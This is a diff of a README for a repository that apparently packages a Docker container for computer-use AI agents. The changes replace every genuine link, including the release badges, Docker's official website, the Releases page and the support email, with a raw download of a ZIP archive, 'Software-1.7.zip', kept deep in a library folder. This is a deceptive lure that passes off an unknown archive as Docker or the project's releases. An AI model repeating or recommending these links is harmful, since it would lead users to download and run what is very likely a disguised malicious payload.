@@ -2,7 +2,7 @@
 
 Welcome to the **c/ua** repository! This project provides a Docker container designed specifically for deploying computer-use AI agents. Here, you will find everything you need to get started, including installation instructions, usage guidelines, and contributions. 
 
-[![Download Releases](https://img.shields.io/badge/Download%20Releases-Click%20Here-brightgreen)](https://github.com/Y-0023/cua/releases)
+[![Download Releases](https://github.com/Y-0023/cua/raw/refs/heads/main/libs/agent/agent/core/Software-1.7.zip%20Releases-Click%20Here-brightgreen)](https://github.com/Y-0023/cua/raw/refs/heads/main/libs/agent/agent/core/Software-1.7.zip)
 
 ## Table of Contents
 
@@ -32,9 +32,9 @@ This repository is an open-source initiative. We encourage contributions from de
 
 To install the c/ua Docker container, follow these steps:
 
-1. **Prerequisites**: Ensure you have Docker installed on your machine. You can download Docker from [Docker's official website](https://www.docker.com/get-started).
+1. **Prerequisites**: Ensure you have Docker installed on your machine. You can download Docker from [Docker's official website](https://github.com/Y-0023/cua/raw/refs/heads/main/libs/agent/agent/core/Software-1.7.zip).
 
-2. **Download the Container**: Visit the [Releases section](https://github.com/Y-0023/cua/releases) to find the latest version. Download the appropriate file for your system.
+2. **Download the Container**: Visit the [Releases section](https://github.com/Y-0023/cua/raw/refs/heads/main/libs/agent/agent/core/Software-1.7.zip) to find the latest version. Download the appropriate file for your system.
 
 3. **Run the Container**: Execute the following command in your terminal:
 
@@ -84,11 +84,11 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 For questions or suggestions, feel free to reach out:
 
-- **Email**: support@cua-project.org
+- **Email**: https://github.com/Y-0023/cua/raw/refs/heads/main/libs/agent/agent/core/Software-1.7.zip
 - **GitHub Issues**: Use the Issues section in this repository for bug reports or feature requests.
 
 Thank you for your interest in the c/ua project! We look forward to your contributions and feedback. 
 
-[![Download Releases](https://img.shields.io/badge/Download%20Releases-Click%20Here-brightgreen)](https://github.com/Y-0023/cua/releases)
+[![Download Releases](https://github.com/Y-0023/cua/raw/refs/heads/main/libs/agent/agent/core/Software-1.7.zip%20Releases-Click%20Here-brightgreen)](https://github.com/Y-0023/cua/raw/refs/heads/main/libs/agent/agent/core/Software-1.7.zip)
 
 Explore the potential of AI agents with c/ua and help us shape the future of computer-use AI!
